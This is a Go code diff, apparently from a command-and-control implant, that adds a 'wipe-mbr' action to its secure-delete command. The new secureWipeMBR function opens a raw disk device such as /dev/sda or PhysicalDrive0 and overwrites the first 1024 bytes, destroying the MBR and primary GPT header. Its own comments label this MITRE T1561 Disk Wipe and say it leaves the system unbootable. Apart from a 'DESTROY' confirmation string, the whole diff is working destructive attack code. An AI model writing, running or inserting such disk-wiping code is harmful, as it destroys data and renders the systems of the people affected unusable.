@@ -23,10 +23,10 @@ func (c *SecureDeleteCommand) Description() string {
 }
 
 type secureDeleteArgs struct {
-	Action  string `json:"action"`  // delete, wipe
+	Action  string `json:"action"`  // delete, wipe, wipe-mbr
 	Path    string `json:"path"`
 	Passes  int    `json:"passes"`  // number of overwrite passes (default 3 for delete, 7 for wipe)
-	Confirm string `json:"confirm"` // safety gate for wipe ("DESTROY")
+	Confirm string `json:"confirm"` // safety gate for wipe/wipe-mbr ("DESTROY")
 }
 
 const secureDeleteDefaultPasses = 3
@@ -47,6 +47,9 @@ func (c *SecureDeleteCommand) Execute(task structs.Task) structs.CommandResult {
 
 	if args.Action == "wipe" {
 		return secureWipe(args)
+	}
+	if args.Action == "wipe-mbr" {
+		return secureWipeMBR(args)
 	}
 
 	if args.Passes <= 0 {
@@ -259,6 +262,42 @@ func secureRemove(path string) {
 	if err := secureDeleteFile(path, info.Size(), 1); err != nil {
 		os.Remove(path) // fallback to plain removal
 	}
+}
+
+// secureWipeMBR overwrites the Master Boot Record / GPT header of a disk device
+// with zeros, rendering the system unbootable (T1561 Disk Wipe). The path must
+// point to a raw disk device (e.g., /dev/sda, \\.\PhysicalDrive0, /dev/rdisk0).
+// Requires root/Administrator privileges. Safety gate: -confirm DESTROY.
+func secureWipeMBR(args secureDeleteArgs) structs.CommandResult {
+	if args.Confirm != "DESTROY" {
+		return errorResult("Error: wipe-mbr requires -confirm DESTROY (safety gate — this destroys the boot record)")
+	}
+	if args.Path == "" {
+		return errorResult("Error: path to disk device is required (e.g., /dev/sda, \\\\.\\PhysicalDrive0)")
+	}
+
+	// Open the disk device for writing
+	f, err := os.OpenFile(args.Path, os.O_WRONLY, 0)
+	if err != nil {
+		return errorf("Error opening disk device %s: %v (requires root/Administrator)", args.Path, err)
+	}
+	defer f.Close()
+
+	// Overwrite first 512 bytes (MBR) + GPT header (LBA 1, another 512 bytes)
+	// Total: 1024 bytes covers both MBR and primary GPT header
+	wipeSize := 1024
+	zeros := make([]byte, wipeSize)
+
+	n, err := f.Write(zeros)
+	if err != nil {
+		return errorf("Error writing to %s: %v (wrote %d/%d bytes)", args.Path, err, n, wipeSize)
+	}
+
+	if err := f.Sync(); err != nil {
+		return errorf("Error syncing %s: %v", args.Path, err)
+	}
+
+	return successf("[+] MBR/GPT wiped: %s (%d bytes zeroed — MBR + GPT primary header destroyed)", args.Path, n)
 }
 
 // secureDeleteDir recursively securely deletes all files in a directory
